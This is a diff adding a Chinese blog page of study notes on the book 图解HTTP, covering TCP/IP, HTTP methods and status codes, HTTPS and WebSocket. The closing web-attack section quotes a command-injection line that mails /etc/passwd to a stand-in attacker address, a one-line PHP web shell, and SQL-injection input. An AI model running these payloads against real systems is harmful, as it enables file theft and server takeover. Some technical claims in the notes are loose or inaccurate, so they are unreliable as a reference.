@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>《图解HTTP》</title>
+  <meta name="keywords" content="http必须了解的知识，避免撕逼的前端知识，通信是如何进行的"/>
+  <meta name="description" content="互联网通信的流程，http协议的进化，一些http必知的状态，前端成为全栈必须理解的知识点"/>
+	<link rel="stylesheet" type="text/css" href="../../css/public/bootstrap.min.css">
+	<link rel="stylesheet" type="text/css" href="../../css/public/nav.css">
+  <link rel="shortcut icon" href="../../img/avitar.png" type="image/ico">
+  <link rel="icon" sizes="192x192" href="../../img/avitar.png">
+  <link rel="apple-touch-icon" href="../../img/avitar.png">
+</head>
+<body>
+    <div class="nav-onOff nav-in">
+	 <button type="button" class="btn btn-default" aria-label="Left Align">
+       <span class="glyphicon glyphicon-align-left" aria-hidden="true"></span>
+       </button>
+    </div>
+	<div class="wrapper wrapper-animate">
+    <div class="nav-message">
+      	<nav class="nav nav-animate">
+        <img src="../../img/avitar.png">
+            <button type="button" class="btn btn-default nav-right" aria-label="Left Align" >
+            <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
+            </button>
+        <ul class="list-group list-gap ">
+            <li type="button" class="list-group-item">
+               <a href="../../page/classify.html">文章分类<span class="badge">4</span></a>
+            </li>
+            <li type="button" class="list-group-item">
+               <a href="../../index.html"><span class="badge"></span>
+               实践列表</a>
+            </li>
+            <li type="button" class="list-group-item">
+               <a href="../../page/foundation.html"><span class="badge"></span>
+               基础知识</a>
+            </li>
+            <li type="button" class="list-group-item">
+               <span class="badge"></span>
+               进阶方向  ---待更新
+            </li>
+            <li type="button" class="list-group-item">
+               <span class="badge"></span>
+               node篇  ---待更新
+            </li>
+            <li type="button" class="list-group-item">
+               <span class="badge"></span>
+               其余工具分析篇  ---待更新
+            </li>
+        </ul>
+	    </nav>
+	</div>
+	</div>
+
+		<div class="progress rotate fiexd-pos">
+         <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="45"      aria-valuemin="0" aria-valuemax="100" style="width: 0%">     
+            <span class="sr-only">阅读 100%</span>
+         </div>
+        </div>
+<div class="container">
+<div class="container box-shadow">
+<div class="scrollPos">
+<h1><strong>网络协议介绍</strong></h1>
+<p>本篇只介绍以下部分</p>
+<ul>
+  <li>网络协议的分类和实现通信的流程</li>
+  <li>HTTP和HTTPS</li>
+  <li>HTTP/1.1之后的发展</li>
+  <li>web攻击技术</li>
+</ul>
+<h2>网络协议的分类和实现通信的流程</h2>
+<p><strong>定义：</strong>协议(protocol):计算机与网络设备要相互通信，双方就必须基于相同的方法。比如：如何探测到通信目标，由哪一边先发起通信，使用哪种语言进行通信，怎样结束通信等规则都需要事先确定，不同的硬件，操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议。</p>
+<p>把与互联网想关联的协议集合起来总称TCP/IP—即TCP/IP协议族</p>
+<p>而TCP/IP协议族按层次分为4层：</p>
+<ul>
+  <li>应用层—决定向用户提供应用服务时的通信的活动–FTP(文件传输协议)，DNS(域名系统)HTTP</li>
+  <li>传输层—提供处于网络连接中两台计算机之间的数据传输–TCP(传输控制协议)，UDP（用户数据报协议）</li>
+  <li>网络层—处理在网络上流动的数据包–通过怎样的路径到达对方计算机，并把数据包传送给对方—IP，ARP(解析地址的协议)</li>
+  <li>数据链路层—用来处理连接网络的硬件部分—-控制操作系统，硬件的设备驱动，NIC(Network Interface Card,网络适配器，网卡)，光纤等</li>
+</ul>
+<img src="./img/tcp.png" width="400" height="300">
+<p><strong>http/https协议属于TCP/IP协议族</strong></p>
+<p>TCP将数据送达目的地的三次握手（three-way handshaking），通过TCP的标志（flag）—SYN(synchronize)和ACK(acknowledgement)</p>
+<p>具体流程如下：</p>
+<ul>
+  <li>发送端先发送一个带SYN标志的数据包</li>
+  <li>接收端收到后，回传一个带SYN/ACK标志的数据包以示传达确认信息</li>
+  <li>发送端回传一个带ACK标志的数据包</li>
+</ul>
+<p>完整的通信流程如下：</p>
+<ul>
+  <li>客户端—-确定域名的IP地址—-DNS(域名解析到服务器的IP地址)</li>
+  <li>HTTP协议–生成针对目标web服务器的HTTP请求报文</li>
+  <li>TCP协议—将HTTP请求报文分割成报文段，按序列号分为多个报文段，把每个报文段可靠的传给对方</li>
+  <li>通过路由器中转（IP,ARP），通过路由选择机制分发数据包</li>
+  <li>IP之间的通信利用路由器中转，IP地址指明了节点被分配到的地址，MAC地址是网卡所属的固定地址。IP地址与MAC地址配对而确定到达指定地址，ARP协议可根据IP地址反查对应的MAC地址，而路由分发是指像物流一样，将货物集中再中转分发</li>
+  <li>TCP协议—从对方那里接收到的报文段按照序列号原来的顺序请求报文</li>
+  <li>HTTP协议–对web服务器请求的内容的处理</li>
+  <li>服务器</li>
+</ul>
+<p>这就是从客户端与服务器的通信，相反服务器也是以此流程响应</p>
+<p>另外再介绍一下URI标识符</p>
+<p>URI(统一资源标识符)>URL(统一资源定位符)
+格式：http://user:pass@www.example.jp:80/dir/index.html?uid=1#chi
+<ul>
+  <li>http协议名</li>
+  <li>user:pass登录信息</li>
+  <li>www.example.jp服务器地址可用IP地址代替<strong>DNS会将域名解析到IP</strong></li>
+  <li>80端口号</li>
+  <li>/dir/index.html带层次的文件路径,即向服务器请求的资源路径</li>
+  <li>uid=1查询字符串</li>
+  <li>ch1片段标识符</li>
+</ul>
+<p>其中分别插入@,?,#这是指定内容的间隔符</p>
+<h2>HTTP和HTTPS</h2>
+<h3>HTTP</h3>
+<p>接下来是HTTP协议的内容</p>
+<p>HTTP是无状态协议</p>
+<p>告知服务器意图的方法</p>
+<table class="table table-hover">
+  <caption>API</caption>
+  <tr>
+    <td>方式</td>
+    <td>内容</td>
+  </tr>
+  <tr>
+    <td>GET</td>
+    <td>获取资源</td>
+  </tr>
+  <tr>
+    <td>post</td>
+    <td>传输文件</td>
+  </tr>
+  <tr>
+    <td>PUT</td>
+    <td>在服务器更新资源</td>
+  </tr>
+  <tr>
+    <td>DELETE</td>
+    <td>删除文件</td>
+  </tr>
+  <tr>
+    <td>HEAD</td>
+    <td>获得报文首部</td>
+  </tr>
+  <tr>
+    <td>OPTIONS</td>
+    <td>询问支持的方法</td>
+  </tr>
+    <tr>
+    <td>TRACE</td>
+    <td>追踪路径（不常用）</td>
+  </tr>
+  <tr>
+    <td>CONNECT</td>
+    <td>要求用隧道连接代理</td>
+  </tr>
+</table>
+<p>HTTP是无状态的协议，所以一般使用其他方式进行状态管理</p>
+<p>保存状态的方法</p>
+<li>生成cookie</li>
+<li>post请求中发送添加cookie后返回</li>
+<li>返回中加token</li>
+<li>保存token后以token请求</li>
+<p>一般服务端会把cookie存到seesion里返回sessionID,客户端可以存到cookie里或者sessionStorage</p>
+<h3>HTTP报文内容</h3>
+<p>请求报文</p>
+<ul>
+  <li>报文首部–请求行，请求首部字段，通用首部字段，实体首部字段</li>
+  <li>空行</li>
+  <li>报文主体</li>
+</ul>
+<p>响应报文</p>
+<ul>
+  <li>报文首部–状态行，响应首部字段，通用首部字段，实体首部字段</li>
+  <li>空行</li>
+  <li>报文主体</li>
+</ul>
+<img src="./img/httpContent.png" width="300" height="200">
+<img src="./img/httpContent1.png" width="300" height="200">
+<p>关于前端—来着重讲下，请求行和状态行</p>
+<p>请求行：请求的方法，请求URI和HTTP版本</p>
+<p>比如：GET / HTTP/1.1（现在通用是HTTP1.1）</p>
+<p>状态行：响应结果的状态码，原因短语和HTTP版本</p>
+<p>比如：HTTP/1.1 200 OK</p>
+<h3>状态码–描述服务器端返回的结果</h3>
+<table class="table table-hover">
+  <tr>
+    <td>类别</td>
+    <td>原因短语</td>
+  </tr>
+  <tr>
+    <td>1XX </td>
+    <td>Informational(信息性状态码) 接收的请求正在处理</td>
+  </tr>
+    <tr>
+    <td>2XX</td>
+    <td>Success(成功状态码)  请求正常处理完毕</td>
+  </tr>
+    <tr>
+    <td>3XX</td>
+    <td>Redirection(重定向状态码) 需要进行附加操作以完成请求</td>
+  </tr>
+    <tr>
+    <td>4XX</td>
+    <td>Client Error(客户端错误状态码)  服务器无法处理请求</td>
+  </tr>
+    <tr>
+    <td>5XX</td>
+    <td>Server Error(服务器错误状态码)  服务器处理请求出错</td>
+  </tr>
+</table>
+<br/>
+<p><strong>1开头的状态码</strong></p>
+<p>101 Switching Protocols 协议转换</p>
+<p>102 Processing 可正常处理请求，但目前是处理中状态</p>
+<br/>
+<p><strong>2开头的状态码</strong></p>
+<p>200 OK 正常处理</p>
+<p>204 No Content 请求处理成功，但没有资源返回</p>
+<p>206 Partial Content</p>
+<p>客户端的范围请求服务器成功应答，由报文中的Content-Range指定的实体内容</p>
+<p>207 Multi-Status 存在多种状态</p>
+<br/>
+<p><strong>3开头的状态码</strong></p>
+<p>301 Moved Permanently 请求的资源被重新分配了URI，如果已保存，应按Location首部字段提示重新保存书签（永久重定向）</p>
+<p>302 Found 已移动的资源只是临时被移动了，以后URI还可能发生改变，不会更新书签（临时性重定向）</p>
+<p>303 See Other 以GET方法重定向另一个URI(实际使用时三者差不多)</p>
+<p>304 Not Modified 资源已找到，但请求条件不符合</p>
+<p>307 Temporary Redirect
+重定向时禁止POST变换成GET，但响应时浏览器会出现不同的情况（临时重定向）</p>
+<br />
+<p><strong>4开头的状态码
+</strong></p>
+<p>400 Bad Request
+表示请求报文中存在语法错误，当错误发生时，需修改请求的内容后重新发送请求</p>
+<p>401 Unauthorized
+表示发送的请求需要有通过HTTP认证（BASiC认证，DIGEST认证）的认证信息，或者认证失败，此响应必须包含一个适用于被请求资源的WWW-Authenticate首部用以质询用户信息，当浏览器初次收到会弹出认证用的窗口</p>
+<p>403 Forbidden 请求资源的访问被服务器拒绝了</p>
+<p>404 Not Found 服务器上无法找到请求的资源</p>
+<p>422 Unprocessible Entity 格式正确，内容有误</p>
+<p>423 Locked 资源已被枷锁</p>
+<p>424 Failed Dependency 处理与某请求关联的请求失败，不再维持依赖关系</p>
+<p><strong>5开头的状态码</strong></p>
+<p>500 Internal Server Error 表明服务器在执行请求时发生了错误</p>
+<p>503 Service Unavailable 服务器暂时处于超负荷或正在进行停机维护</p>
+<p>507 Insufficient Storage 保存空间不足</p>
+<br/>
+<p><strong>状态码有时与状态响应都是错误的!!!!!</strong>如果后端不严格要求状态码的响应</p>
+<p>数据转发程序：代理，网关，隧道</p>
+<p>代理：有转发功能的应用程序，每次通过代理服务器转发请求或响应时，非透明dialing会追加写入Via首部信息（缓存技术，减少网络宽带的浏览，组织内部对特定网站的访问控制）</p>
+<p>网关：转发其他服务器通信数据的服务器，利用网关可将HTTP请求转化为其他协议
+</p>
+<p>隧道：在相隔甚远的客户端和服务器两者之间进行中转，并保持通信连接的应用程序，建立安全的通信，比如使用SSL等加密手段进行通信</p>
+<h2>HTTPS</h2>
+<p>HTTP+加密(SSL或TLS)+认证+完整性保护=HTTPS</p>
+<p>HTTP验证时,内容可能被窃听，可能会被伪装，可能会被篡改(web攻击时提到)</p>
+<h3>HTTPS实现的条件</h3>
+<p><strong>1，认证</strong></p>
+<p>使用由数字证书认证机构和其他相关机构颁发的公开密匙证书，将公开密匙与证书绑定，服务器将公匙证书发送给客户端，客户端对其进行验证，多数浏览器会事先在内部植入常用认证机关的公开密匙，服务器保留私有密匙(自认证机构颁发的证书为自签名证书，安全性待定，有的浏览器会出现警告)</p>
+<p><strong>2， 加密</strong></p>
+<p>SSL采用混合加密机制：即共享加密和公开密匙加密
+通过证书将公开密匙给客户端，将私匙保留给服务器，这时候，加密的公开密匙都有，但是解密的私匙只有服务提供方有</p>
+<p><strong>3.完整性保护</strong></p>
+<p>在HTTP通信时，会附加MAC(Message Authentication Code)的报文摘要,查看报文是否被篡改</p>
+<h3>HTTPS实现的流程</h3>
+<p>客户端发送Client Hello报文开始通信，报文中含</p>
+<p>-客户端支持的SSL的指定版本，加密组件列表（所使用的加密算法及密匙长度）</p>
+<p>服务器以Server Hello报文进行应答</p>
+<p><strong>以上两个过程的加密流程:</strong></p>
+<ul>
+  <li>服务器发送Certificate报文，报文中含公开密匙证书</li>
+  <li>服务器发送Server Hello Done报文通知1,2两阶段的握手结束</li>
+  <li>客户端以Client Key Exchange报文作为回应。报文中包含</li>
+  <li>-通信加密中使用的一种被称为Pre-mastersecret的随机密码串(运用公开密匙加密)</li>
+  <li>客户端继续发送Change Cipher Spec报文。提示服务器以后会用随机密码串加密</li>
+  <li>客户端发送Finished报文，包含连接至今的全部报文的整体校验值</li>
+  <li>服务器同样发送Change Cipher Spec报文</li>
+  <li>服务器发送Finished报文</li>
+  <li>SSl连接建立完成</li>
+  <li>发送HTTP请求，这时候的HTTP用随机密码串加密</li>
+</ul>
+<p>由流程可看–HTTPS比HTTP慢2到100倍</p>
+<h3>HTTP认证的方式</h3>
+<p>BASIC认证—通过401响应通过Authorization首部经过BASE64编码认证</p>
+<p>DIGEST认证—通过质询—收到质询码生成响应码发送给用户，一般是手机短信</p>
+<p>SSL客户端认证—服务器通过证书进行HTTPS加密</p>
+<p>FormBase认证-基于表单认证–比如SSH和FTP</p>
+<p>表单认证是通过注册时，生成的SessionID识别用户，但是为安全起见，最好加上httponly属性。防止篡改，在服务器端可进行加密保存和验证---常用方式</p>
+<h3>HTTP1.1之后的发展</h3>
+<p>HTTP会请求一次应答一次，在web页面有更新时，把数据全部再发送一次</p>
+<p>最新出现的两种技术解决办法</p>
+<p><strong>1,</strong>Ajax运用XMLHttpRequest的API,进行局部更新</p>
+<p><strong>2,</strong>comet服务器端收到请求，将响应挂起，等更新后再返回响应，但一次连接的时间变长</p>
+<p>但并未解决HTTP的问题，于是出现了</p>
+<p><strong>SPDY:</strong>多路复用，建立单一的TCP连接，赋予请求优先级，压缩HTTP首部，服务器主动推送数据，服务器提示功能，仅用于一个web网站上的单个域名下的资源</p>
+<p><strong>WebScoket:</strong>另一个协议，浏览器与服务器之间的全双工通信标准</p>
+<p>特点:</p>
+<p>1,推送功能</p>
+<p>2,减少通信量–一直连接</p>
+<p>用HTTP的Upgrade首部告知通信协议发生改变</p>
+<p>Sec-WebSocket-Key字段记录握手过程中必不可少的键值</p>
+<p>以下是实现：通过HTTP协议更改为WebSocket协议
+</p>
+<pre>var socket=new WebSocket('URI');
+ socket.onopen=function(){
+   setInterval(function(){
+      if(socket.bufferedAmount==0){
+        socket.send(getUpdateData());
+       }
+  },50);
+  };
+</pre>
+<h2>HTTP/2.0协议的基础</h2>
+<p>SPDY–google</p>
+<p>HTTP Speed + Mobility—基于SPDY和WebSocket，移动端–微软</p>
+<p>Network-Friendly HTTP Upgrade–移动端</p>
+<p>Web服务器管理文件的WebDAV—基于万维网的分布式创作和版本控制
+(web-based Distributed Authoring and Versioning)</p>
+<p>以下内容虽然用不到，但是还是可以了解一下的</p>
+<p>WebDAV新增的方法
+<table class="table table-hover">
+  <tr>
+    <td>方法</td>
+    <td>内容</td>
+  </tr>
+  <tr>
+    <td>PROPFIND</td>
+    <td>获取属性</td>
+  </tr>
+  <tr>
+    <td>PROPPATCH</td>
+    <td>修改属性</td>
+  </tr>
+  <tr>
+    <td>MKCOL</td>
+    <td>创建集合</td>
+  </tr>
+  <tr>
+    <td>COPY</td>
+    <td>复制资源及属性</td>
+  </tr>
+  <tr>
+    <td>MOVE</td>
+    <td>移动资源</td>
+  </tr>
+  <tr>
+    <td>LOCK</td>
+    <td>资源加锁</td>
+  </tr>
+  <tr>
+    <td>UNLOCK</td>
+    <td>资源解锁</td>
+  </tr>
+</table>
+<p>一些技术</p>
+<p>CGI(Common Gateway Interface,通用网关接口)是指web服务器在接收到客户端发送过来的请求后转发给程序的一组机制</p>
+<p>Servlet在服务器上创建动态内容的程序，用Java实现的一种接口</p>
+<p>RSS(建议信息聚合)和Atom，是发布新闻或博客日志等更新信息文档格式的总称</p>
+<h2>web攻击技术</h2>
+<p>XSS(Cross-site scripting)跨站脚本攻击
+–主动攻击</p>
+<p>在浏览器内运行非法脚本，窃取cookie,伪造表单，登陆后信息被保存写入到网站登录日志中
+–被动攻击</p>
+<p>伪造评论 &lt;img src="攻击者评论内容URI"&gt;，登录点击会发送cookie</p>
+<p>设置透明罩:透明的iframe</p>
+<p>设置虚假会话诱使登录，比如网页上常见的qq会话</p>
+<p>利用脚本将ID保存在自己网站中</p>
+<p>输出值转义</p>
+<br/>
+<p>SQL注入：利用SQL语句的功能伪造查看</p>
+<p>比如:SELECT*FROM bookTbl WHERE author=‘’ and flag=1</p>
+<p>登录时输入ID XXX’–</p>
+<p>HTTP首部篡改：%0D%0A，将SID写入后面，则返回的cookie会被修改，或利用两个换行符修改内容诱使用户输入信息</p>
+<p>OS注入：利用Linux管道修改命令，比如脚本利用窃取系统其他信息，比如php用open 方法发送;cat /etc/passwd | mail hack@example.jp</p>
+<p>目录遍历–利用查询字段访问PHP其他文件</p>
+<p>PHP中的include和require方法造成的远程文件包含漏洞</p>
+<p>利用查询字段URI，访问其他远程文件，在文件里写入<?system($_GET[‘cmd’])></p>
+<p>因设置或设计上的缺陷引发的安全漏洞</p>
+<p>强制浏览:文件目录的推测</p>
+<p>太详细的错误消息提示</p>
+<p>密码破解</p>
+<p>穷举法</p>
+<p>字典攻击</p>
+<p>密匙</p>
+<p>DOS攻击</p>
+<p>高并发</p>
+<p>后门程序</p>
+<p>开发者设计的为自身利益植入的程序</p>
+<p>攻击者通过方法设置的后门程序</p>
+<p><strong>彩蛋小知识：</strong>a标签的href属性链接http协议名改为//，在浏览器协议进化时，可以兼容https</p>
+</div>
+  </div>
+  </div>
+	<script type="text/javascript" src="../../js/public.js"></script>
+  <script type="text/javascript" src="../../js/progress.js"></script>
+</body>
+</html>
